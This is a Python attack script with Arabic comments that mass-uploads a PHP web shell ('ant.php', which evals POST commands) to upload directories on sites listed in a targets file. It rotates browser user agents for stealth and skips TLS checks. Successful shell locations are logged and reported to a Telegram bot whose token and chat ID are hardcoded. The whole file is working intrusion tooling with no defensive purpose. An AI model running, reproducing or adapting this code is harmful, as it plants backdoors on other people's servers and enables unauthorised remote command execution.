import asyncio, httpx, os, time, random, signal

# --- بيانات القيادة المؤمنة ---
TOKEN = "8290479304:AAEa6o56IPfTNb8KJqSfiFXWLVjfU4DjxS0"
CHAT_ID = "7228901951"
SECURE_TUNNELS = "codehub_tunnels.log"
ANT_PAYLOAD = "<?php echo 'CodeHub_Ant_Active'; @eval(\$_POST['cmd']); ?>"

# قائمة متصفحات للتخفي (User-Agents)
AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

def handler(signum, frame):
    print("\n[🚨] Stealth Shutdown Initiated...")
    os._exit(0)
signal.signal(signal.SIGINT, handler)

async def send_to_bot(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        try: await client.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=5)
        except: pass

async def plant_and_secure(client, url):
    if not url.startswith('http'): url = 'https://' + url
    # إضافة رأس متصفح عشوائي لكل طلب (أمان إضافي)
    headers = {"User-Agent": random.choice(AGENTS)}
    try:
        paths = ["/wp-content/uploads/", "/tmp/", "/upload/"]
        for p in paths:
            t_path = url.rstrip('/') + p + "ant.php"
            try:
                # محاولة الرفع مع التخفي
                await client.post(url.rstrip('/') + p, files={'file': ('ant.php', ANT_PAYLOAD)}, headers=headers, timeout=5)
                chk = await client.get(t_path, headers=headers, timeout=5)
                if "CodeHub_Ant_Active" in chk.text:
                    msg = f"<b>🔥 [CodeHub] TUNNEL SECURED!</b>\n<code>{t_path}</code>"
                    print(f"\n{msg}\a")
                    await send_to_bot(msg)
                    with open(SECURE_TUNNELS, "a") as f:
                        f.write(f"{time.strftime('%H:%M:%S')} | {t_path}\n")
                    return True
            except: continue
    except: pass

async def main():
    links = set()
    if os.path.exists("targets.txt"):
        with open("targets.txt", "r") as f:
            for line in f:
                if "http" in line:
                    links.add([w for w in line.replace('|',' ').split() if "http" in w][0].strip().strip(','))
    
    links_list = list(links)
    random.shuffle(links_list)
    print(f"[🛡️] Stealth Mode Active. Monitoring {len(links_list)} Targets...")
    await send_to_bot("<b>🛡️ CodeHub: Stealth System Online.</b>")

    async with httpx.AsyncClient(verify=False, http2=True) as client:
        for i in range(0, len(links_list), 10):
            batch = links_list[i:i+10]
            await asyncio.gather(*[plant_and_secure(client, u) for u in batch])
            await asyncio.sleep(random.uniform(1, 2))

if __name__ == "__main__":
    asyncio.run(main())
